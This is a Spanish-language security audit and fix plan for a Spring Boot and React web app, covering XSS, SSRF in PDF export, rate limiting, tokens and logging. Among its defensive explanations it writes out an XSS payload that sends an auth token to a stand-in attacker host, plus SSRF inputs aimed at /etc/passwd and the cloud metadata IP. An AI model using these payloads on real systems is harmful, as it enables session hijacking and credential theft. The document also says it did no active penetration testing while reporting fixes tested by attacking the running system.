# Eje de seguridad

Auditoría del sistema y plan de corrección. Cada hallazgo tiene cómo se explota, por qué importa
y cómo se arregla.

**Alcance:** API Spring Boot, frontend React, base Postgres, Redis, y el deploy tal como está
planificado en [`../DEPLOY.md`](../DEPLOY.md). Revisado el 2026-08-13 sobre el código de esa
fecha.

> **Estado al 2026-08-13:** los hallazgos marcados ✅ ya están corregidos y probados contra el
> sistema corriendo. Los que quedan abiertos están listados al final, en el plan de trabajo.

---

## La superficie expuesta a quien no tiene acceso

Lo primero es saber **con qué puede hablar alguien de internet que nunca recibió una cuenta**.
Todo lo demás exige que alguien le haya dado acceso, y eso ya es otra categoría de riesgo.

Sin autenticar, sólo se llega a cinco puertas:

| Endpoint | Qué hace | Cómo está protegido |
|---|---|---|
| `POST /api/auth/login` | Entrar como usuario | Bloqueo por IP y por cuenta ✅. Mismo error para usuario inexistente y contraseña mala |
| `POST /api/auth/colaborador/login` | Entrar como colaborador | Igual, más el nombre del proyecto |
| `POST /api/auth/refresh` | Renovar la sesión | El token es un UUID de 122 bits: no se adivina. Reuso detectado ✅ |
| `POST /api/solicitudes-acceso` | Pedir acceso | Tope de 3 por hora por IP. **Falta captcha** |
| `GET /api/landing/textos` | Los textos de la portada | Público a propósito: es el contenido de la home |

Todo lo demás de la API responde 401 sin un token válido, y los tokens están firmados con
HMAC-SHA256: no se pueden fabricar sin la clave del servidor.

**De ahí sale el orden real de prioridades para un sitio público:**

1. **Que no se pueda evadir el freno a la fuerza bruta** — era el agujero más serio de cara
   afuera, y estaba abierto: bastaba mandar una cabecera. ✅ **Cerrado** (A5)
2. **Que nadie pueda tumbar el servicio** con pedidos grandes o repetidos. ✅ **Cerrado** en la
   parte de código (C3); lo que falta es el captcha (M10) y Cloudflare
3. **Que el navegador de un visitante no ejecute nada ajeno**, aunque algo se cuele. ✅ (C1, A6)
4. **Que quede rastro** de todo lo anterior, o no hay forma de darse cuenta. ✅ (A8)

Los hallazgos que exigen una cuenta —C1 y C2— siguen siendo críticos y por eso están arriba en
la lista, pero por un motivo distinto: no los explota un desconocido, los explota alguien a
quien invitaron a un proyecto. El riesgo no es que entre cualquiera, es que un permiso chico
alcance para algo grande.

## Qué está bien hecho

Antes de la lista de problemas, porque condiciona las prioridades:

- **Las contraseñas se guardan con BCrypt**, nunca en claro, y nunca viajan en una respuesta HTTP:
  la generada al aprobar una solicitud sólo sale por mail.
- **El access token vive en memoria**, no en `localStorage` (`front/src/lib/tokens.ts`). Esto ya
  es mejor que la mayoría de los proyectos y reduce mucho el daño de un XSS.
- **Los refresh tokens rotan** en cada uso y se revocan al cerrar sesión; el access token se
  agrega a una lista negra en Redis con el TTL que le queda.
- **No hay inyección SQL**: todo pasa por JPA con parámetros, no hay concatenación de consultas.
- **La autorización está centralizada**, no repartida: `AccesoFaseService` es el único lugar que
  responde "esta sesión, en esta fase de este proyecto, qué puede hacer". Eso hace que sea
  auditable y que un olvido sea visible.
- **Los mensajes de error no filtran información**: login inválido dice siempre "Credenciales
  inválidas" sin distinguir usuario inexistente de contraseña incorrecta, el alta de solicitud da
  la misma respuesta exista o no el email, y el handler genérico nunca devuelve el stack trace.
- **Los DTO son explícitos**: no hay binding directo a entidades, así que no hay *mass assignment*.

---

## Hallazgos

Ordenados por riesgo real, no por categoría.

### 🔴 C1 · XSS almacenado en los documentos → robo de sesión

**Dónde:** `front/src/pages/Paso.tsx:258` y `front/src/pages/Landing.tsx:106` renderizan HTML con
`dangerouslySetInnerHTML`. El HTML viene de la base, y la API lo guarda **tal como llega**
(`GuardarDocumentoRequest.contenido` es un `String` sin ninguna limpieza).

**Cómo se explota:** el editor del navegador produce HTML limpio, pero nadie obliga a usar el
editor. Un colaborador con permiso de edición hace un `PUT` directo a
`/api/proyectos/{id}/pasos/{pasoId}/documento` con:

```json
{"contenido": "<img src=x onerror=\"fetch('https://atacante/'+localStorage.getItem('pipoe.auth'))\">", "version": 3}
```

Cuando el **dueño del proyecto** abre ese paso, el script corre en su sesión y se lleva el refresh
token. Con eso el atacante mantiene la sesión de la víctima indefinidamente, porque el refresh
rota pero no caduca mientras se use.

**Por qué es la número uno:** convierte un permiso menor (editar un documento) en control total de
la cuenta de quien lo lea. Y la víctima natural es la persona con más permisos del proyecto.

**Cómo se arregla:**

1. **Sanitizar en el servidor al guardar.** `jsoup` ya está en el `pom.xml` (lo agregué para la
   exportación). Pasar el contenido por una `Safelist` que permita sólo lo que el editor produce:
   `p, br, strong, em, u, s, h1-h3, ul, ol, li, blockquote, code`. Sin atributos, sin `img`, sin
   `a href`, sin `style`. Aplicarlo en `DocumentoService.guardar` y en
   `TextoLandingService.actualizar`.
2. **Sanitizar también al renderizar**, con DOMPurify en el frontend. Defensa en profundidad: si
   mañana entra HTML por otra vía, no se ejecuta.
3. **Content-Security-Policy** (ver A6). Con una CSP sin `unsafe-inline`, un `onerror` inyectado
   no corre aunque llegue a la página.

Los tres, no uno.

### 🔴 C2 · La exportación a PDF puede leer archivos del servidor

**Dónde:** `ExportacionService.aPdf` le pasa el HTML del documento a openhtmltopdf, que **resuelve
recursos externos** por defecto.

**Cómo se explota:** el mismo colaborador guarda en el documento
`<img src="file:///etc/passwd">` o `<img src="http://169.254.169.254/latest/meta-data/">` y
descarga el PDF. El renderizador va a buscar ese recurso desde el servidor y lo incrusta. En un
VPS el segundo caso no devuelve nada interesante, pero en un cloud grande esa IP es el servicio de
metadatos y puede entregar credenciales de la instancia.

**Cómo se arregla:** la sanitización de C1 ya elimina `img` y `link`, que es el 90% del problema.
Además, configurar el `PdfRendererBuilder` con un resolvedor de recursos que niegue todo lo
externo, para que no dependa sólo del filtro de entrada.

### 🔴 C3 · Sin límite de tamaño en lo que se guarda

**Dónde:** `GuardarDocumentoRequest.contenido` tiene `@NotNull` y nada más. La columna es `TEXT`
de Postgres, que acepta hasta 1 GB.

**Cómo se explota:** un `PUT` con 50 MB de texto se acepta sin chistar. Repetido, llena el disco
del servidor. Y como **cada guardado escribe una fila nueva en `documento_versiones` con una copia
completa del documento**, el costo se multiplica: 100 guardados de 5 MB son 500 MB.

**Cómo se arregla:**

- `@Size(max = 200_000)` en el contenido del documento (200 KB de HTML son unas 60 páginas de
  texto: de sobra para "una carilla").
- `client_max_body_size 2m` en nginx — ya está previsto en `DEPLOY.md`, hay que no olvidarlo.
- Alerta de disco al 80% (también prevista en `DEPLOY.md`).

### 🟠 A4 · El historial crece sin techo

**Dónde:** `documento_versiones` es append-only y el frontend autoguarda cada 2,5 segundos de
inactividad. Una sesión de escritura de una hora puede dejar cientos de filas, cada una con una
copia entera del documento.

No es un ataque, es aritmética: con 4 proyectos ya se nota; con 50 usuarios reales es el problema
de infraestructura más probable del primer año.

**Cómo se arregla:** una tarea programada que consolide. Retener todas las versiones de las
últimas 48 horas, y de ahí para atrás quedarse con la última de cada autor por día. Se implementa
con un `@Scheduled` nocturno. Nada de esto cambia lo que ve el usuario en el historial reciente.

### 🟠 A5 · El rate limiting se puede evadir y no cubre el ataque más común

Son tres problemas del mismo mecanismo:

1. **`X-Forwarded-For` se cree sin verificar** (`RequestUtils.clientIp`). Ese header lo manda el
   cliente. Si el proxy del borde no lo pisa, el atacante manda una IP distinta en cada intento y
   nunca se bloquea. *(Ya está avisado en `DEPLOY.md`, pero ahí figura como detalle de
   configuración; es una vulnerabilidad.)* Se arregla con
   `proxy_set_header X-Forwarded-For $remote_addr;` en el nginx del borde.
2. **El contador es sólo por IP, no por cuenta.** Cinco intentos por IP no frenan un *credential
   stuffing* desde muchas IPs contra una misma cuenta. Se arregla sumando un segundo contador con
   clave por email.
3. **Bloquear por IP castiga a inocentes.** Una oficina o una universidad detrás de un NAT
   comparte IP: cinco errores de una persona dejan afuera a todas. Con el contador por cuenta se
   puede aflojar el de IP.

### 🟠 A6 · No hay cabeceras de seguridad

La app no manda ninguna de las cabeceras estándar. Faltan:

| Cabecera | Qué previene |
|---|---|
| `Content-Security-Policy` | Que un XSS pueda ejecutar scripts o mandar datos afuera |
| `Strict-Transport-Security` | Que alguien fuerce la conexión a HTTP |
| `X-Frame-Options: DENY` | Clickjacking: la app metida en un iframe ajeno |
| `X-Content-Type-Options: nosniff` | Que el navegador adivine tipos de contenido |
| `Referrer-Policy` | Que las URLs internas se filtren a sitios externos |
| `Permissions-Policy` | Acceso a cámara, micrófono, ubicación |

Van en el nginx del borde. La CSP es la que más trabajo da porque hay que enumerar los orígenes
permitidos; auto-hospedar las tipografías (ver el eje visual) la simplifica bastante.

### 🟠 A7 · El robo de un refresh token no se detecta

**Dónde:** `RefreshTokenService.validateAndRotate` hace un `getAndDelete`: consume el token viejo
y emite uno nuevo.

Si un atacante roba un refresh token y lo usa primero, obtiene una sesión válida y la víctima
queda deslogueada sin entender por qué. El sistema no se entera de nada.

El estándar (OAuth 2.0 Security BCP) es **detección de reuso**: cada token pertenece a una familia;
si llega un token ya consumido, se invalida la familia entera y se cierran todas las sesiones de
esa persona. Es la señal más clara de que hubo un robo.

**Cómo se arregla:** en vez de borrar el token al rotarlo, marcarlo como usado con un TTL corto y
guardar el id de familia. Si aparece uno usado, borrar todas las claves de esa familia.

### 🟠 A8 · No hay registro de seguridad

`GlobalExceptionHandler.handleGeneric` atrapa cualquier excepción y devuelve 500 **sin loggear
nada**. No queda rastro de logins fallidos, bloqueos, 403 ni errores internos.

Esto es un problema por sí mismo —un 500 en producción es indiagnosticable— y además hace
**imposible** cualquier detección de ataques, que es lo que preguntabas más abajo.

**Cómo se arregla:** loggear con nivel WARN, en formato estructurado, los eventos de seguridad:
login fallido, bloqueo de IP, 401, 403, 5xx, cambio de contraseña, alta y baja de colaborador,
aprobación de solicitud. Con IP, cuenta y momento. **Nunca** el token ni la contraseña.

### 🟡 M9 · Falta recuperación de contraseña

Hoy no existe. Si alguien pierde la suya, la única salida es entrar a la base a mano. Con usuarios
reales eso no escala y termina en algo peor: contraseñas mandadas por WhatsApp.

Cuando se implemente, hacerlo bien: token de un solo uso con expiración de 15–30 minutos, guardado
*hasheado*, invalidado al usarse, y **la misma respuesta exista o no el email** para no filtrar
quién tiene cuenta.

### 🟡 M10 · El formulario público no tiene captcha

`POST /api/solicitudes-acceso` es público con un tope de 3 por hora por IP. Un bot con proxies
rotativos llena la tabla de solicitudes y le arruina la bandeja a Arlette. Cloudflare Turnstile es
gratis y no muestra puzzles al usuario.

### 🟡 M11 · Secretos a punto de entrar al historial de git

El proyecto **todavía no es un repositorio git y no tiene `.gitignore`**. En la raíz hay:

- `CREDENCIALES-TEST.md` — contraseñas reales del entorno local, en texto plano;
- `front/.env` — configuración con valores reales.

El primer `git add .` los deja en el historial **para siempre**, aunque después se borren. Si el
repo va a GitHub, aunque sea privado, es una filtración.

**Cómo se arregla:** escribir el `.gitignore` **antes** del primer commit, incluyendo
`CREDENCIALES-TEST.md`. `DEPLOY.md` ya avisa de `front/.env` pero no de este archivo.

### 🟡 M12 · Sin control de dependencias

No hay nada que avise de una vulnerabilidad conocida en Spring, React o cualquiera de sus
dependencias. Con el repo en GitHub, activar Dependabot es un archivo de cinco líneas.

### 🟢 B13 · Detalles menores

- **Un `GET` que escribe.** `DocumentoService.detalle` crea la fila del documento si no existe.
  Funciona y está acotado a los 37 pasos del proyecto propio, pero un `GET` no debería modificar
  estado. Es prolijidad, no riesgo.
- **Enumeración de proyectos.** El login de colaborador pide el nombre del proyecto, que es único
  en toda la aplicación. Conviene revisar que el error no distinga "proyecto inexistente" de
  "credenciales inválidas".
- **Sin caducidad absoluta de sesión.** El refresh dura 7 días y se renueva con cada uso, así que
  una sesión activa no expira nunca. Vale poner un tope absoluto (por ejemplo 30 días) que obligue
  a volver a autenticarse.

---

## ¿Hace falta un detector de ataques?

Sí, pero **no construyéndolo**. Esa es la parte importante de la respuesta.

Para un sitio de este tamaño, escribir un detector de anomalías propio es donde se van meses de
trabajo para terminar con algo que da falsas alarmas y se ignora. Lo que sí es común y
proporcionado, en orden de rendimiento por esfuerzo:

**1. Cloudflare adelante de todo (gratis).** Es el movimiento de mayor impacto de toda esta lista.
Con el plan gratuito ya tenés WAF con reglas administradas, mitigación de bots, límite de
peticiones, protección contra DDoS y ocultamiento de la IP real del servidor. Es media hora de
configuración y reemplaza a un montón de trabajo propio.

**2. fail2ban en el servidor.** Lee los logs de SSH y de nginx y bloquea IPs a nivel de firewall.
Estándar en cualquier VPS, se configura en una tarde.

**3. Logs de seguridad estructurados (hallazgo A8).** Sin esto, ninguna detección es posible. Es el
prerequisito de todo lo demás.

**4. Alertas simples, no un panel.** Un panel que nadie mira no sirve. Lo que sirve es que te
llegue un mensaje cuando pasa algo:
   - la app no responde (chequeo externo cada minuto, ya está en `DEPLOY.md`);
   - más de N bloqueos de IP en una hora;
   - un pico de 5xx;
   - cualquier login exitoso de un ADMIN, siempre —son dos cuentas, cada entrada debería ser
     esperada.

**5. Recién si el proyecto crece:** enviar los logs a un servicio gestionado (Grafana Loki, Better
Stack, Axiom) con alertas por consulta. Antes de tener usuarios reales, es sobreingeniería.

---

## Plan de trabajo

### ✅ Hecho el 2026-08-13

Todo esto está implementado y **probado atacando el sistema corriendo**, no sólo compilado:

| | Qué se hizo | Cómo se comprobó |
|---|---|---|
| **C1** | `HtmlSanitizer` con lista blanca cerrada en la API, y `HtmlSeguro` con DOMPurify en el front. Se aplica a documentos y a textos de la portada | Un `PUT` con `<script>`, `<img onerror>`, `javascript:` y `style` se guardó como texto limpio |
| **C2** | El generador de PDF no resuelve ningún recurso externo (`useUriResolver` devuelve null) | El PDF de un documento con `file:///etc/passwd` salió sin nada adentro |
| **C3** | `@Size(max = 200_000)` en el contenido del documento | Un `PUT` de 300 KB devolvió 400 |
| **A4** | `PodaHistorialService`: tarea nocturna que conserva los últimos 3 días completos y de ahí para atrás un guardado por autor y por día | Compila y la consulta corre; falta verla actuar sobre datos viejos |
| **A5.1** | `X-Forwarded-For` se ignora salvo que `TRUST_PROXY=true`. En desarrollo se usa la IP del socket | Seis intentos rotando la cabecera: bloqueado igual al quinto |
| **A5.2** | Segundo contador por cuenta, con tope propio, y normalización a minúsculas | — |
| **A6** | Cabeceras en Spring Security: CSP, `X-Frame-Options`, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, HSTS | Verificadas en la respuesta |
| **A7** | Familias de refresh token con detección de reuso: si aparece uno ya canjeado, se revocan todas las sesiones de esa persona | Usar una copia de un token ya canjeado invalidó también al legítimo |
| **A8** | Renglones `SEGURIDAD ...` para login fallido, bloqueo, reuso de token, acceso denegado y entrada de un ADMIN. Los 500 van al log con traza completa, y al cliente sólo "Error interno" | Verificados en el log |
| **M11** | `.gitignore` en la raíz, con `CREDENCIALES-TEST.md` y los `.env` | Escrito antes de que exista el repo |

**Nota sobre C1:** el sanitizado corre al **guardar**. Los documentos guardados antes de este
cambio siguen con el HTML viejo en la base; los cubre DOMPurify al mostrarlos, y se limpian solos
la próxima vez que alguien los edite.

### Pendiente · configuración del deploy

Nada de esto es código; va cuando se contrate el servidor. Está detallado en
[plan-deploy.md](plan-deploy.md).

- **Cloudflare** adelante de todo, y recién entonces `TRUST_PROXY=true` con el nginx copiando
  `CF-Connecting-IP`. En ese orden.
- **Content-Security-Policy del front** en el nginx que sirve la página. La que puso Spring
  protege las respuestas de la API, que no son documentos navegables; la de la página es otra y
  es la que de verdad contiene un XSS.
- `client_max_body_size 2m` en nginx: el tope real de tamaño antes de que el cuerpo llegue a la
  aplicación.
- **fail2ban** leyendo los renglones `SEGURIDAD`.
- Alertas y chequeo externo de salud.

### Pendiente · código, primeras semanas

- **M9 · Recuperación de contraseña.** Es la más importante de las que quedan, y no por seguridad
  sino porque sin ella la salida de emergencia es entrar a la base a mano.
- **M10 · Turnstile** en el formulario público. Necesita la cuenta de Cloudflare primero.
- **M12 · Dependabot**, apenas exista el repo en GitHub.
- **B13 · Los detalles menores**: el `GET` que escribe, el mensaje del login de colaborador, y un
  tope absoluto de duración de sesión.

### Cuando haya usuarios reales

- Revisión externa. Un escaneo automatizado (OWASP ZAP) es gratis y encuentra lo obvio; un pentest
  pago tiene sentido recién si el sistema maneja datos sensibles de terceros.

---

## Lo que esta auditoría no cubre

Para que quede claro el alcance y no genere falsa tranquilidad:

- **No revisé las dependencias una por una** contra bases de vulnerabilidades conocidas. Eso lo
  hace Dependabot (M12).
- **No hice pruebas de penetración activas** contra el sistema corriendo: es una lectura de código
  y de configuración.
- **No cubre la seguridad del servidor** una vez desplegado —SSH, firewall, actualizaciones del
  sistema operativo—. Eso corresponde al eje de deploy.
- **No cubre lo legal**: si se guardan datos personales de residentes europeos, el formulario de
  acceso pide varios (nombre, género, edad, ocupación, país), y eso tiene requisitos propios de
  consentimiento, aviso de privacidad y borrado. Vale consultarlo aparte.
